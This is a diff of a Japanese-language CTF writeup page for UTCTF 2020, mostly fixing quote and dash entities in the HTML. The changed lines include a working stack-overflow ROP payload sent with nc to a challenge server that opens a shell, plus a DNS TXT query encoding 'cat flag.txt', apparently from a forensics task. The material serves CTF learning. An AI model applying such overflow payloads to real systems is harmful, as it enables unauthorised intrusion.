@@ -165,7 +165,7 @@
     <div class="post-content">
       
 
-<p>URL: <a href="https://utctf.live/challenges">https://utctf.live/challenges</a>
+<p>URL: <a href="https://utctf.live/challenges" target="_blank">https://utctf.live/challenges</a>
 <br /><br />
 えと、簡単なのしか解いてないので、テキトーです。</p>
 
@@ -249,7 +249,7 @@
 <p><br>
 <pre>
 captureamerica@kali:~/CTF/UTCTF_2020$ checksec ./pwnable
-[*] &lsquo;/home/captureamerica/CTF/UTCTF_2020/pwnable&rsquo;
+[*] '/home/captureamerica/CTF/UTCTF_2020/pwnable'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -264,7 +264,7 @@ captureamerica@kali:~/CTF/UTCTF_2020$ checksec ./pwnable
 <p><br>
 pop rdi ; retを使います。
 <pre>
-captureamerica@kali:~/CTF/UTCTF_2020$ ROPgadget &ndash;binary pwnable | grep ret | grep &ldquo;: pop&rdquo;
+captureamerica@kali:~/CTF/UTCTF_2020$ ROPgadget --binary pwnable | grep ret | grep &quot;: pop&quot;
 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
 0x0000000000400690 : pop r14 ; pop r15 ; ret
@@ -274,7 +274,7 @@ captureamerica@kali:~/CTF/UTCTF_2020$ ROPgadget &ndash;binary pwnable | grep ret
 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
 0x0000000000400520 : pop rbp ; ret
 0x000000000040028e : pop rbp ; retf 0x2d9e
-0x0000000000400693 : pop rdi ; ret   &lt;&mdash; これ
+0x0000000000400693 : pop rdi ; ret   &lt;--- これ
 0x0000000000400691 : pop rsi ; pop r15 ; ret
 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 </pre></p>
@@ -291,13 +291,13 @@ gef➤  x get_flag
 <pre>
 captureamerica@kali:~/CTF/UTCTF_2020$ python3
 &gt;&gt;&gt; hex(-0x21524111+0xffffffff)
-&lsquo;0xdeadbeee&rsquo;
+'0xdeadbeee'
 </pre></p>
 
 <p><br>
 以下でフラグゲット。
 <pre>
-captureamerica@kali:~/CTF/UTCTF_2020$ (python -c &ldquo;print(&lsquo;a&rsquo;*112+&lsquo;a&rsquo;*8+&rsquo;\x93\x06\x40\x00\x00\x00\x00\x00&rsquo;+&rsquo;\xef\xbe\xad\xde\x00\x00\x00\x00&rsquo;+&rsquo;\xea\x05\x40\x00\x00\x00\x00\x00&rsquo;)&rdquo; ; cat - ) | nc binary.utctf.live 9002
+captureamerica@kali:~/CTF/UTCTF_2020$ (python -c &quot;print('a'*112+'a'*8+'\x93\x06\x40\x00\x00\x00\x00\x00'+'\xef\xbe\xad\xde\x00\x00\x00\x00'+'\xea\x05\x40\x00\x00\x00\x00\x00')&quot; ; cat - ) | nc binary.utctf.live 9002
 I really like strings! Please give me a good one!
 Thanks for the string
 id
@@ -322,7 +322,7 @@ Flag: <code>utflag{thanks_for_the_string_!!!!!!}</code></p>
 <h3 id="challenge-1">Challenge</h3>
 
 <blockquote>
-<p>I found some weird data while monitoring my network, but I didn&rsquo;t catch it all. See if you can make sense of it.</p>
+<p>I found some weird data while monitoring my network, but I didn't catch it all. See if you can make sense of it.</p>
 </blockquote>
 
 <p>Attachment:</p>
@@ -357,7 +357,7 @@ Flag: <code>utflag{thanks_for_the_string_!!!!!!}</code></p>
 <h3 id="challenge-2">Challenge</h3>
 
 <blockquote>
-<p>One of my servers was compromised, but I can&rsquo;t figure it out. See if you can solve it for me!</p>
+<p>One of my servers was compromised, but I can't figure it out. See if you can solve it for me!</p>
 </blockquote>
 
 <p>Attachment:</p>
@@ -421,7 +421,11 @@ captureamerica@kali:~$ dig -t TXT Y2F0IGZsYWcudHh0Cg== @35.188.185.68
           <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
           </div>
       <nav class="post-nav">
-        
+        <a class="prev" href="https://captureamerica.github.io/writeups/post/angstromctf_2020/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">ångstromCTF 2020 Writeup | フラxxグゲット</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
         <a class="next" href="https://captureamerica.github.io/writeups/post/kntuctf_2020/">
             <span class="next-text nav-default">KNTU CTF Writeup | フラxxグゲット</span>
             <span class="next-text nav-mobile">Next</span>
